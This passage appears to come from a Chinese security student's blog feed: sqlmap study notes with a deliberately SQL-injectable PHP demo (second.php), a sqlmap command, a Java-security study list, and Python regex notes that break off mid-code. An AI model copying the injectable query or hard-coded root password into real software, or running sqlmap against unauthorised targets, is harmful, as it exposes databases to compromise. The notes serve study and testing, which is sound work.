<h3 id="环境部署-三个服务器使用nginx、mysql、redis"><a href="#环境部署-三个服务器使用nginx、mysql、redis" class="headerlink" title="环境部署-三个服务器使用nginx、mysql、redis"></a>环境部署-三个服务器使用nginx、mysql、redis</h3><p><a href="https://www.bilibili.com/video/BV13a411q753/?p=189&spm_id_from=pageDriver&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">项目优化Day3-06-项目部署_部署架构&amp;部署环境说明_哔哩哔哩_bilibili</a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_study</title>
    <url>/2023/04/08/sqlmap-study/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122243790">sqlmap深入分析-优质文章整理篇（sqlmap 源码分析、os-shell 原理、攻防角度使用sqlmap）_sqlmap源码分析_OceanSec的博客-CSDN博客</a></p>
<p>在使用sqlmap时存在以下的问题：</p>
<p>1、有回显的是如何判断哪个对应哪个的，如果回显编码了怎么办（如base64）</p>
<p>2、怎样判断是否存在注入？一个界面元素不少，如果只是单纯回显一些会变的垃圾信息呢</p>
<p>3、启发式测试是什么</p>
<p>……</p>
<span id="more"></span>

<h2 id="我的测试环境"><a href="#我的测试环境" class="headerlink" title="我的测试环境"></a>我的测试环境</h2><p>sqlmap版本：1.5.10.17#dev</p>
<p>在buuctf上弄动态靶场</p>
<p>然后pycharm断点运行</p>
<h2 id="sqlmap自己分析"><a href="#sqlmap自己分析" class="headerlink" title="sqlmap自己分析"></a>sqlmap自己分析</h2><h2 id="sqlmap-项目剖析（I）-使用"><a href="#sqlmap-项目剖析（I）-使用" class="headerlink" title="sqlmap 项目剖析（I）-使用"></a>sqlmap 项目剖析（I）-使用</h2><h3 id="0x00-sqlmap-介绍"><a href="#0x00-sqlmap-介绍" class="headerlink" title="0x00 sqlmap 介绍"></a>0x00 sqlmap 介绍</h3><p>sqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具，有着十余年的开发历史（当然这也造就了一些问题），这款工具最强大的地方在于它对数据库种类以及注入类型的支持堪称史诗级。</p>
<p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析（I）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>使用懒得写了，上面的链接有说。</p>
<p>主要记录自己不是很熟练的部分。</p>
<p>1、指定 burp log 作为目标输入</p>
<p>首先开启 burpsuite 的请求日志记录功能</p>
<p>后续在抓包时相关的包会被保存到对应的日志文件里</p>
<p>此时结合 sqlmap -l 的参数即可对此日志中的数据包进行自动化注入测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>

<p>2、二次注入</p>
<p>sqlmap 同样支持二次注入场景下的测试与利用，这个功能主要是依赖于 <code>--second-*</code> 参数进行实现。</p>
<p>自己写了个简单的demo测试：</p>
<p>新建数据库test。</p>
<p>sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建second数据库</span><br><span class="line">CREATE DATABASE IF NOT EXISTS `second`;</span><br><span class="line"></span><br><span class="line">-- 使用second数据库</span><br><span class="line">USE `second`;</span><br><span class="line"></span><br><span class="line">-- 创建users表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) NOT NULL,</span><br><span class="line">  `password` varchar(255) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">-- 插入测试数据</span><br><span class="line">INSERT INTO `users` (`id`, `username`, `password`) VALUES</span><br><span class="line">(1, &#x27;admin&#x27;, &#x27;admin123&#x27;),</span><br><span class="line">(2, &#x27;user1&#x27;, &#x27;password1&#x27;),</span><br><span class="line">(3, &#x27;user2&#x27;, &#x27;password2&#x27;);</span><br></pre></td></tr></table></figure>

<p>first.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// $password = addslashes($_GET[&#x27;password&#x27;]);</span></span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// 转义特殊字符</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;replace into users(id,username,password)values(1,&#x27;admin&#x27;,&#x27;<span class="subst">$password</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>second.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_startup_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL);</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&#x27;select password from users where id=1;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出查询结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">        <span class="comment">// echo var_dump($row);</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$result1</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;select * from users where password = &#x27;<span class="subst">$value</span>&#x27;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row1</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result1</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230426164201842.png" alt="image-20230426164201842"></p>
<h2 id="sqlmap-项目剖析（II）"><a href="#sqlmap-项目剖析（II）" class="headerlink" title="sqlmap 项目剖析（II）"></a>sqlmap 项目剖析（II）</h2><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析（II）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>sqlmap步骤：</p>
<ul>
<li>全局变量初始化</li>
<li>命令行参数解析</li>
<li>全局变量赋值</li>
<li>环境检查</li>
<li>目标连通性检查</li>
<li>WAF 探测</li>
<li>页面动态内容提取</li>
<li>参数动态性检测</li>
<li>启发式测试</li>
</ul>
<p>下面挑一点详细的看</p>
<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Main function of sqlmap when running from command line.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dirtyPatches()</span><br><span class="line">        resolveCrossReferences()</span><br><span class="line">        checkEnvironment()</span><br><span class="line">        setPaths(modulePath())</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">        args = cmdLineParser()</span><br><span class="line">        cmdLineOptions.update(args.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(args, <span class="string">&quot;__dict__&quot;</span>) <span class="keyword">else</span> args)</span><br><span class="line">        initOptions(cmdLineOptions)</span><br><span class="line"></span><br><span class="line">        init()</span><br><span class="line">        start()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>todo</title>
    <url>/2023/05/24/todo/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1Sv4y1i7jf/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">B站最全的Java安全学习路线_哔哩哔哩_bilibili</a></p>
<p>Java安全{<br>    IDEA （finish）<br>    Maven <a href="https://www.bilibili.com/video/BV1Ah411S7ZE/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Maven全套教程，maven项目管理从基础到高级，Java项目开发必会管理工具maven_哔哩哔哩_bilibili</a>	，<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>，<a href="https://zhuanlan.zhihu.com/p/37701743">java注解-最通俗易懂的讲解 - 知乎 (zhihu.com)</a></p>
<span id="more"></span>

<p>Java Web</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尚硅谷p21</span><br><span class="line"></span><br><span class="line">黑马https://www.bilibili.com/video/BV1m84y1w7Tb</span><br><span class="line">p79</span><br></pre></td></tr></table></figure>

<p>​	反射<br>​	ASM&#x2F;Javassist<br>​	JNDI：8u191低版本和高版本怎么打(反序列化&#x2F;本地工厂)，以及如何审计<br>​	RMI是什么<br>​	Java Agent：启动原理和RASP的实现原理<br>​	JMX&#x2F;JDWP<br>​	反序列化基础：gadget链、JEP290是什么<br>​	FastJson反序列化<br>​	WebLogic：二次反序列化、XML Decoder、IIOP&#x2F;T3<br>​	Xstream反序列化<br>​	Hessian反序列化：dubbo<br>​	SnakeYAML反序列化<br>​	Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马<br>​	Struts2<br>​	Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用<br>​	Tomcat：Tomcat AJP RCE<br>​	内存马原理：原理是什么、有哪些内存马<br>​	内存马如何查杀<br>​	Log4J<br>​	其他组件漏洞：Apache Solr、Flink<br>​	进阶：tabby、codeql等静态分析<br>}</p>
<p><del>真多</del></p>
<h2 id="TODO："><a href="#TODO：" class="headerlink" title="TODO："></a>TODO：</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">status</th>
</tr>
</thead>
<tbody><tr>
<td align="center">了解jsp shell</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">正则表达式</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">P神java安全漫谈学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">jsfinder 使用</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">jsfinder代码理解</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">sqlmap源码学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">DIVA study</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">学习免杀与查杀</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">了解fastjson漏洞原理</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解cors的危害</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解正则表达式</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解shiro漏洞</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Ldap注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">leetcode top100</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">log4j漏洞分析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mysql学习</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="了解fastjson反序列化漏洞原理："><a href="#了解fastjson反序列化漏洞原理：" class="headerlink" title="了解fastjson反序列化漏洞原理："></a>了解fastjson反序列化漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson 教程：https://www.bilibili.com/video/BV1Hy4y1x7ri/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d1cb46e12f3981bbb347ae0eb3b44edd</span><br><span class="line"></span><br><span class="line">靶场复现：https://blog.csdn.net/Bossfrank/article/details/130100893</span><br><span class="line"></span><br><span class="line">漏洞原理：https://www.freebuf.com/vuls/361576.html</span><br></pre></td></tr></table></figure>

<h3 id="Cors漏洞原理："><a href="#Cors漏洞原理：" class="headerlink" title="Cors漏洞原理："></a>Cors漏洞原理：</h3><h3 id="JSP-shell"><a href="#JSP-shell" class="headerlink" title="JSP shell"></a>JSP shell</h3><p><a href="https://www.runoob.com/jsp/jsp-tutorial.html">JSP 教程 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://xz.aliyun.com/t/7798">都0202年了老嗨还在用的 - 各种姿势jsp webshell - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/s452195377/article/details/93388422">tomcat下jsp shell（webshell）_shell.jsp_夜行侠~@的博客-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1667652">【实战篇】记一次文件上传漏洞绕过 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://www.cnblogs.com/blacksunny/p/8001201.html">文件上传漏洞（绕过姿势） - blacksunny - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/straycats/p/14461357.html">https://www.cnblogs.com/straycats/p/14461357.html</a></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><a href="https://blog.csdn.net/pagean/article/details/106032082">一篇认真的正则入门文章：正则表达式数字和数字范围匹配表达_正则表达式匹配数字范围_曼巴的脚步的博客-CSDN博客</a></p>
<p><a href="https://www.runoob.com/python/python-reg-expressions.html">Python 正则表达式 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://www.sojson.com/regex/generate">正则表达式生成器，常用正则表达式在线生成 (sojson.com)</a></p>
<p><a href="https://www.mklab.cn/utils/regex">Regex正则表达式在线测试生成工具 - MKLab在线工具</a></p>
<p><a href="https://www.cnblogs.com/admans/p/11955614.html#:~:text=%E4%BB%8E%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E8%AE%B2%EF%BC%8C%E8%A2%AB%E5%8C%B9%E9%85%8D%E4%BC%98%E5%85%88%E9%87%8F%E8%AF%8D%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%AD%90%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AF%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%A6%82%E2%80%9C,(Expression">正则表达式之 贪婪与非贪婪模式详解（概述） - JackieZhengChina - 博客园 (cnblogs.com)</a>%2B”；被忽略优先量词修饰的子表达式使用的就是非贪婪模式，如“ (Expression)%2B%3F”。)</p>
<p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">Python—re.findall的用法_扫地di的博客-CSDN博客</a></p>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</p>
<p>re 模块使 Python 语言拥有全部的正则表达式功能。</p>
<p>compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。</p>
<h4 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h4><p>re.match 尝试从字符串的<strong>起始位置</strong>匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</p>
<p>语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">re.match(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pattern</td>
<td align="center">匹配的正则表达式</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">要匹配的字符串。</td>
</tr>
<tr>
<td align="center">flags</td>
<td align="center">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a href="https://www.runoob.com/python/python-reg-expressions.html#flags">正则表达式修饰符 - 可选标志</a></td>
</tr>
</tbody></table>
<p>re的修饰符：</p>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="center">re.L</td>
<td align="center">做本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响 ^ 和 $</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>
</tr>
</tbody></table>
<p>下面讲个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">line = <span class="string">&quot;Cats are smarter than dogs&quot;</span></span><br><span class="line"> </span><br><span class="line">matchObj = re.<span class="keyword">match</span>( <span class="string">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class="number">1</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matchObj.group() :  Cats are smarter than dogs</span><br><span class="line">matchObj.group(1) :  Cats</span><br><span class="line">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>

<p>对应结果为：</p>
<table>
<thead>
<tr>
<th align="center">匹配对象方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">group(num&#x3D;0)</td>
<td align="center">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="center">groups()</td>
<td align="center">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<p>因为match比较菜，就不多说了。</p>
<h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>

<p>函数参数说明：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pattern</td>
<td align="left">匹配的正则表达式</td>
</tr>
<tr>
<td align="left">string</td>
<td align="left">要匹配的字符串。</td>
</tr>
<tr>
<td align="left">flags</td>
<td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>
</tr>
</tbody></table>
<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>
<p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
<table>
<thead>
<tr>
<th align="left">匹配对象方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">group(num&#x3D;0)</td>
<td align="left">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="left">groups()</td>
<td align="left">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<h4 id="re-match与re-search的区别"><a href="#re-match与re-search的区别" class="headerlink" title="re.match与re.search的区别"></a>re.match与re.search的区别</h4><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
<h4 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.sub(pattern, repl, string, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>pattern : 正则中的模式字符串。</li>
<li>repl : 替换的字符串，也可为一个函数。</li>
<li>string : 要被查找替换的原始字符串。</li>
<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">phone = <span class="string">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除字符串中的 Python注释 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;#.*$&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是: &quot;</span>, num</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除非数字(-)的字符串 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;\D&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是 : &quot;</span>, num</span><br><span class="line"><span class="comment">#电话号码是:  2004-959-559 </span></span><br><span class="line"><span class="comment">#电话号码是 :  2004959559</span></span><br></pre></td></tr></table></figure>

<p>repl 参数是一个函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double</span>(<span class="params">matched</span>):</span><br><span class="line">    value = <span class="built_in">int</span>(matched.group(<span class="string">&#x27;value&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(value * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">&#x27;A23G4HFD567&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.sub(<span class="string">&#x27;(?P&lt;value&gt;\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>

<p>不管了，直接实战</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;1.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">columns = df.columns.values.tolist()  <span class="comment">### 获取excel 表头 ，第一行</span></span><br><span class="line"><span class="comment"># res=[]</span></span><br><span class="line">myfile = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">patter1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line">patter2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d-25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)-(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():  <span class="comment">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        curstr = row[column]</span><br><span class="line">        <span class="keyword">if</span> pd.isna(curstr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span 